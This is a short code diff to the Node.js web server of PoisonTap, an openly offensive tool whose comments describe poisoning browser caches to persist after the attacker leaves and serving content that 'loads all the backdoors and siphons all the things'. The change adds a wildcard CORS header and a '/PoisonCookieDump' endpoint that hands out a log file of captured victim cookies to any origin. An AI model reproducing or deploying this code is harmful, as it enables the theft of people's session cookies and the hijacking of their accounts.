@@ -71,7 +71,8 @@ var server = http.createServer(function(request, response) {
 		"Server": "PoisonTap/1.0 SamyKamkar/0.1",
 		"Cache-Control": "public, max-age=99936000",
 		"Expires": "Sat, 26 Jul 2040 05:00:00 GMT",
-		"Last-Modified": "Tue, 15 Nov 1994 12:45:26 GMT"
+		"Last-Modified": "Tue, 15 Nov 1994 12:45:26 GMT",
+		"Access-Control-Allow-Origin": "*"
 	};
 
 	// cache for a very long time to poison future requests after we're gone
@@ -100,7 +101,17 @@ var server = http.createServer(function(request, response) {
 		response.end();
 		return;
 	}
-
+	
+	// if this is a cookie dump request, return cookie file.  CORS header required to make it work
+	else if (url.indexOf('/PoisonCookieDump') != -1)
+	{
+		console.log('>>> Cookie Dump');
+		response.writeHead(200, headers);
+		response.write(fs.readFileSync(__dirname + '/poisontap.cookies.log'));
+		response.end();
+		return;
+	}
+	
   // random AJAX request or load from a page, give our evil content that loads all the backdoors and siphons all the things
 	else
 	{
